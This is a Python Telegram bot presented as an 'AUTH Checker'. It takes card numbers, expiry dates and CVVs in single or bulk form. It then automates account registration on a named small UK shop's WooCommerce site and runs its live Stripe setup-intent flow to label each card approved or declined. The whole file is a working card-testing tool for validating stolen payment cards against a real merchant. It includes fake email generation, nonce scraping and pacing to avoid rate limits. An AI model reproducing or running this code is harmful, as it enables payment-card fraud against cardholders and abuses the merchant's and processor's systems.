import requests
import pyfiglet
import time
import os
import random
import re
import telebot
import logging
from telebot import types
from collections import deque
from threading import Thread

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# Telegram bot setup
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')  # Get from environment variable for security
if not BOT_TOKEN:
    raise ValueError("No bot token provided. Set the TELEGRAM_BOT_TOKEN environment variable.")

bot = telebot.TeleBot(BOT_TOKEN)

# Task queues and active operations
task_queue = deque()
active_operations = {}
MAX_WORKERS = 3  # Maximum number of concurrent workers

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 
                 "🔐 *Welcome to the AUTH Checker Bot* 🔐\n\n"
                 "Available commands:\n"
                 "/check - Check individual cards\n"
                 "/mass - Check cards in bulk format\n"
                 "/status - View system status\n"
                 "/help - Show detailed help",
                 parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    bot.reply_to(message, 
                 "*AUTH Checker Bot Help*\n\n"
                 "*Commands:*\n"
                 "/check - Check cards (1 per line)\n"
                 "/mass - Check cards in bulk (10 per line)\n"
                 "/status - Check service status\n"
                 "/stop - Stop an ongoing check\n\n"
                 "*Card Formats:*\n"
                 "• Regular: CARDNUMBER|MONTH|YEAR|CVV\n"
                 "• Mass: CARD1|M1|Y1|CVV1 CARD2|M2|Y2|CVV2 ...\n\n"
                 "Examples:\n"
                 "/check 4242424242424242|03|25|123\n"
                 "/mass 4242424242424242|03|25|123 4111111111111111|04|26|456",
                 parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status(message):
    queue_size = len(task_queue)
    active_ops = len(active_operations)

    status_msg = (
        "✅ *System Status*\n\n"
        f"• Active checks: {active_ops}/{MAX_WORKERS}\n"
        f"• Queue size: {queue_size}\n"
        f"• System time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
    )

    bot.reply_to(message, status_msg, parse_mode="Markdown")

@bot.message_handler(commands=['check'])
def check_cards(message):
    chat_id = message.chat.id

    # Extract text after the command
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ *Error*: No cards provided.\n\nFormat: /check CARDNUMBER|MONTH|YEAR|CVV", parse_mode="Markdown")
        return

    cards_text = command_parts[1].strip()
    cc_lines = cards_text.split('\n')

    if len(cc_lines) > 10:
        bot.reply_to(message, "⚠️ Maximum 10 cards allowed per check.", parse_mode="Markdown")
        return

    # Add task to queue
    status_message = bot.send_message(chat_id, "⏳ *Added to queue. Processing will start soon...*", parse_mode="Markdown")

    # Queue the task
    task = {
        'type': 'regular',
        'chat_id': chat_id,
        'status_msg_id': status_message.message_id,
        'cc_lines': cc_lines,
    }

    task_queue.append(task)
    logger.info(f"Added task to queue. Queue size: {len(task_queue)}")

@bot.message_handler(commands=['mass'])
def mass_check(message):
    chat_id = message.chat.id

    # Extract text after the command
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ *Error*: No cards provided.\n\nFormat: /mass CARD1|M1|Y1|CVV1 CARD2|M2|Y2|CVV2 ...", parse_mode="Markdown")
        return

    # Process the input for mass check
    cards_text = command_parts[1].strip()
    lines = cards_text.split('\n')

    all_cards = []
    for line in lines:
        # Split the line by spaces to get individual card entries
        cards_in_line = line.split()
        all_cards.extend(cards_in_line)

    if not all_cards:
        bot.reply_to(message, "❌ *Error*: No valid cards found.", parse_mode="Markdown")
        return

    if len(all_cards) > 30:
        bot.reply_to(message, "⚠️ Maximum 30 cards allowed per mass check.", parse_mode="Markdown")
        return

    # Add task to queue
    status_message = bot.send_message(
        chat_id, 
        f"⏳ *Mass check added to queue. Processing {len(all_cards)} cards...*", 
        parse_mode="Markdown"
    )

    # Queue the mass check task
    task = {
        'type': 'mass',
        'chat_id': chat_id,
        'status_msg_id': status_message.message_id,
        'cc_lines': all_cards,
    }

    task_queue.append(task)
    logger.info(f"Added mass check task to queue. Queue size: {len(task_queue)}")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    chat_id = message.chat.id
    if chat_id in active_operations:
        active_operations[chat_id]["stopped"] = True
        bot.send_message(chat_id, "🛑 Stopping the current check process...")
    else:
        # Check if there are any queued tasks for this user
        for i, task in enumerate(list(task_queue)):
            if task['chat_id'] == chat_id:
                task_queue.remove(task)
                bot.reply_to(message, "✅ Removed your task from the queue.")
                return
        bot.reply_to(message, "No active check to stop.")

def process_cards(task):
    chat_id = task['chat_id']
    status_message_id = task['status_msg_id']
    cc_lines = task['cc_lines']
    task_type = task['type']

    # Mark this chat as having an active operation
    active_operations[chat_id] = {"status_msg_id": status_message_id, "stopped": False}

    try:
        results = []
        results.append(f"🔍 *AUTH CHECKER RESULTS ({task_type})*\n")
        results.append("-----------------------------")

        # Update status message to show we're starting
        try:
            bot.edit_message_text(
                "\n".join(results) + "\n⏳ *Starting check...*",
                chat_id=chat_id,
                message_id=status_message_id,
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Error updating start message: {str(e)}")

        for idx, P in enumerate(cc_lines):
            # Check if operation was stopped
            if chat_id in active_operations and active_operations[chat_id]["stopped"]:
                results.append("\n🛑 *Process stopped by user*")
                break

            if '|' not in P:
                results.append(f"❌ Invalid format: `{P}`")
                continue

            parts = P.split('|')
            if len(parts) < 4:
                results.append(f"❌ Invalid format: `{P}`")
                continue

            n = parts[0]
            mm = parts[1]
            yy = parts[2][-2:] if len(parts[2]) >= 2 else parts[2]
            cvc = parts[3].replace('\n', '').split()[0]  # Handle any trailing data
            P_cleaned = f"{n}|{mm}|{yy}|{cvc}"
            mail = f"criehs4d{str(random.randint(584, 5658))}@gamil.com"

            results.append(f"💳 *Testing:* `{P_cleaned}`")

            try:
                # Update status message to show progress
                if idx > 0 and (idx % 3 == 0 or idx == len(cc_lines) - 1):
                    try:
                        # Only keep the last 15 results to avoid message too long errors
                        current_results = results.copy()
                        if len(current_results) > 18:  # Header + separator + 15 results + progress
                            current_results = current_results[:2] + current_results[-16:]

                        bot.edit_message_text(
                            "\n".join(current_results) + f"\n\n⏳ *Progress: {idx+1}/{len(cc_lines)}*",
                            chat_id=chat_id,
                            message_id=status_message_id,
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        logger.error(f"Error updating message: {str(e)}")

                # Registration request
                response = requests.get('https://quiltedbear.co.uk/my-account/', timeout=15)
                nonce = gets(response.text, 'name="woocommerce-register-nonce" value="', '" ')

                if not nonce:
                    results.append("❌ Failed to get registration nonce")
                    continue

                # Register account
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://quiltedbear.co.uk',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                }

                data = {
                    'username': mail,
                    'email': mail,
                    'woocommerce-register-nonce': nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }

                response = requests.post('https://quiltedbear.co.uk/my-account/', headers=headers, data=data, timeout=15)

                # Get payment page
                response = requests.get('https://quiltedbear.co.uk/my-account/add-payment-method/', headers=headers, timeout=15)
                response_text = response.text

                pattern1 = r'"createAndConfirmSetupIntentNonce":"(.*?)"'
                match1 = re.search(pattern1, response_text)
                if not match1:
                    results.append("❌ Failed to get payment nonce")
                    continue

                payment_nonce = match1.group(1)

                # Create payment method with Stripe
                headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                }

                data = {
                    'type': 'card',
                    'card[number]': n,
                    'card[cvc]': cvc,
                    'card[exp_year]': yy,
                    'card[exp_month]': mm,
                    'billing_details[address][postal_code]': '10080',
                    'billing_details[address][country]': 'US',
                    'key': 'pk_live_90o1zSEv0cxulJp2q9wFbksO',
                }

                response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)

                if 'id' not in response.json():
                    results.append(f"❌ Card Error: {response.json().get('error', {}).get('message', 'Unknown error')}")
                    continue

                id = response.json()['id']

                # Confirm setup intent
                headers = {
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://quiltedbear.co.uk',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {
                    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
                }

                data = {
                    'action': 'create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': id,
                    'wc-stripe-create-and-confirm-setup-intent-nonce': payment_nonce
                }

                response = requests.post('https://quiltedbear.co.uk/', params=params, headers=headers, data=data, timeout=15)

                # Process the response
                if 'success' in response.json() and response.json()['success']:
                    results.append(f"✅ *APPROVED*: `{P_cleaned}`")
                else:
                    error_msg = response.json().get('message', 'Unknown error')
                    if "card was declined" in error_msg:
                        results.append(f"❌ *DECLINED*: `{P_cleaned}`")
                    else:
                        results.append(f"⚠️ *ERROR*: {error_msg[:50]}...")

            except Exception as e:
                results.append(f"⚠️ *Error processing card*: {str(e)[:50]}")

            results.append("-----------------------------")
            # Sleep a bit between cards to avoid rate limiting
            # Shorter delay for mass checks
            time.sleep(1 if task_type == 'mass' else 2)

        # Create summary sections
        approved = sum(1 for line in results if "*APPROVED*" in line)
        declined = sum(1 for line in results if "*DECLINED*" in line)
        errors = sum(1 for line in results if "ERROR" in line or "Error" in line)

        summary = [
            f"\n✅ *Check completed*",
            f"• Total cards: {len(cc_lines)}",
            f"• Approved: {approved}",
            f"• Declined: {declined}",
            f"• Errors: {errors}"
        ]

        # Send final results, handling message too long errors
        try:
            # Only keep most recent results if there are too many
            if len(results) > 30:
                final_results = results[:2] + ["...(some results omitted)..."] + results[-27:] + summary
            else:
                final_results = results + summary

            bot.edit_message_text(
                "\n".join(final_results),
                chat_id=chat_id,
                message_id=status_message_id,
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Error sending final results: {str(e)}")
            # If message is too long, send as a new message with summary only
            bot.send_message(
                chat_id,
                "\n".join(summary),
                parse_mode="Markdown"
            )

    except Exception as e:
        logger.error(f"Error in process_cards: {str(e)}")
        bot.send_message(chat_id, f"❌ An error occurred: {str(e)[:100]}")
    finally:
        # Clean up the active operations map
        if chat_id in active_operations:
            del active_operations[chat_id]

# Poll task queue and process tasks
def task_poller():
    while True:
        try:
            # If there are tasks in the queue and we have worker slots available
            if task_queue and len(active_operations) < MAX_WORKERS:
                # Get the next task
                task = task_queue.popleft()

                # Check if this user already has an active operation
                chat_id = task['chat_id']
                if chat_id in active_operations:
                    # Put the task back at the end of the queue
                    task_queue.append(task)
                    time.sleep(1)
                    continue

                # Process the task in a new thread
                Thread(target=process_cards, args=(task,), daemon=True).start()
                logger.info(f"Started processing task. Queue size: {len(task_queue)}")
            else:
                # No tasks or no available workers, sleep a bit
                time.sleep(1)

        except Exception as e:
            logger.error(f"Error in task_poller: {str(e)}")
            time.sleep(5)

# Start the poller thread
def start_polling():
    poller_thread = Thread(target=task_poller, daemon=True)
    poller_thread.start()
    logger.info("Started task poller thread")

# Start the bot
if __name__ == "__main__":
    logger.info("Starting bot as a backend worker...")
    start_polling()  # Start the polling mechanism
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
